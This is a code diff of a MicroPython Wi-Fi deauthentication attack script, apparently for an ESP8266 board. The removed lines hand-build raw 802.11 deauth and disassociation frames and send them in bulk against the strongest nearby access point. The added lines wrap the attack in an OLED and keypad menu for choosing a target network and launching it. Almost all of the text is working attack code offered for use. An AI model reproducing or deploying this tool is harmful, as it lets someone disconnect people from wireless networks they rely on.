@@ -1,80 +1,79 @@
-
-import network
+from machine import I2C,Pin,ADC
+import attack
 import time
-import uos
-import wireless
+import ubinascii as binascii
+import gc
 
+# ADkeyboard请自己重新测试4个按键的值
+i2c=I2C(sda=Pin(04), scl=Pin(05), freq=1000000) #SDA D2 GPIO04; SCL D1 GPIO05
+from ssd1306 import SSD1306_I2C
+oled = SSD1306_I2C(128, 64, i2c) 
+q=attack.ap_list()[0:8]
 
-
-# sta_if=network.WLAN(0)#0：STA 模式 1：AP模式
-# sta_if.active(True)
-# ap_list=sta_if.scan()
-
-sta_if=wireless.attack(0)#0：STA 模式 1：AP模式
-sta_if.active(True)
-ap_list=sta_if.scan()
-print(ap_list)
-ssid=''
-bssid=''#bssid:AP MAC address
-channel=''#信道
-_client=[0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]#默认
-
-def deauth(_ap,_client,type,reason):
-    # 0 - 1   type, subtype c0: deauth (a0: disassociate)
-    # 2 - 3   duration (SDK takes care of that)
-    # 4 - 9   reciever (target)
-    # 10 - 15 source (ap)
-    # 16 - 21 BSSID (ap)
-    # 22 - 23 fragment & squence number
-    # 24 - 25 reason code (1 = unspecified reason)
-    packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
-    for i in range(0,6):
-        packet[4 + i] =_client[i]
-        packet[10 + i] = packet[16 + i] =_ap[i]
-    #set type
-    packet[0] = type;
-    packet[24] = reason
-    result=sta_if.send_pkt_freedom(packet)
-    if result==0:
-        time.sleep_ms(1)
-        return True
+def view(q,num=0):
+    num=mun(num)
+    oled.fill(0)
+    oled.text("wifi name",0,0,1)
+    oled.text(q[num][0].decode("utf8"),0,8,1)
+    oled.text("BSSID:",0,16,1)
+    oled.text(binascii.hexlify(q[num][1]).decode("utf8"),0,24,1)
+    oled.text("Channel:"+str(q[num][2]),0,32,1)
+    oled.text(str(q[num][3])+"dBm",0,40,1)
+    oled.show()
+def mun(num):
+    if num<0:
+        num=0
+    elif num>7:
+        num=7
     else:
-        return False
-    
-if __name__=="__main__":
-    max_rssid=0
-    max_id=0
-    num=0
+        pass
+    return num
+def select(q,num=0):
+    num=mun(num)
+    numP=num*8
+    oled.fill(0)
+    j=0
+    for i in q:
+        if j<64:
+            oled.text(i[0].decode("utf8"),8,j,1)
+            j+=8
+    oled.text("*",0,numP,1)
+    oled.show()
+    return q[num]
+def atf(wi,vi):
+    if vi==785:
+        oled.fill(1)
+        oled.text("Attack wifi",0,16,0)
+        oled.text(wi[0].decode("utf8"),0,32,0)
+        oled.show()
+        attack.Attack(attack.sta_if(),wi,1)
+    else:
+        pass
 
-    #获取信号最强的AP 进行攻击
-    for i in ap_list:
-        if max_rssid==0:
-            max_rssid=i[3]#rssid
-        else:
-            if i[3]>max_rssid:
-                max_rssid=i[3]
-                max_id=num
+
+adc=ADC(0)
+wi=select(q,0)
+num=0
+st=0
+while 1:
+    v=adc.read()
+    if v in range(150,200):
+        num-=1
+        num=mun(num)
+        wi=select(q,num)
+    elif v in range(300,350):
         num+=1
-    ssid=ap_list[max_id][0]
-    bssid=ap_list[max_id][1]
-    channel=ap_list[max_id][2]
-    print('ssid:',ssid,'-bssid:',bssid)
-    print('-channel:',channel,'-rssid:',max_rssid)
-    sendNum=50000#攻击次数
-   
-    print('******************************')
-    if sta_if.setAttack(channel):
-        print('Set Attack OK')
-        time.sleep_ms(100)
-        print('---deauth runing-----')
-        for i in range(0,sendNum):
-            r_=deauth(bssid, _client, 0xC0, 0x01)
-            if r_:
-                
-                deauth(bssid, _client, 0xA0, 0x01)
-                deauth(_client, bssid, 0xC0, 0x01)
-                deauth(_client, bssid, 0xA0, 0x01)
-                time.sleep_ms(5)
-            else:
-                print('---deauth fail-------')
-            time.sleep_ms(5000)
+        num=mun(num)
+        wi=select(q,num)
+    elif v in range(750,800):
+        st=785
+    elif v in range(0,50):
+        st=0
+        wi=select(q,num)
+    elif v in range(500,550):
+        view(q,num)
+    else:
+        pass
+    atf(wi,st)
+    time.sleep(0.3)
+    gc.collect()
